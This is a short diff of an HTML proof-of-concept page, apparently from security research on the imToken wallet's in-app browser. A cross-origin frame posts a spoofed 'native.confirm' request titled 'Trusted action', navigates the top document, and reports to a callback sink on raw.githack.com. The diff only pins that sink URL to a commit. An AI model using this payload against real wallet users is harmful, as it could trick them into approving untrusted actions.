@@ -5,7 +5,7 @@
 <button id="start">Continue</button><pre id="s">Embedded cross-origin frame ready.</pre>
 <script>
 const ID=707070;
-const SINK='https://raw.githack.com/nan-zellic/imtoken-provider-probe-20261005/main/callback-sink.html?run=CALLBACK_EPOCH_20261005_01&id='+ID;
+const SINK='https://raw.githack.com/nan-zellic/imtoken-provider-probe-20261005/1d1d00b/callback-sink.html?run=CALLBACK_EPOCH_20261005_01&id='+ID;
 start.onclick=()=>{
   const msg={apiName:'native.confirm',messageId:ID,payload:{title:'Trusted action',message:'Approve the test action',cancelText:'Cancel',confirmText:'Confirm'}};
   s.textContent='Posting request '+JSON.stringify(msg)+' then navigating the top document.';
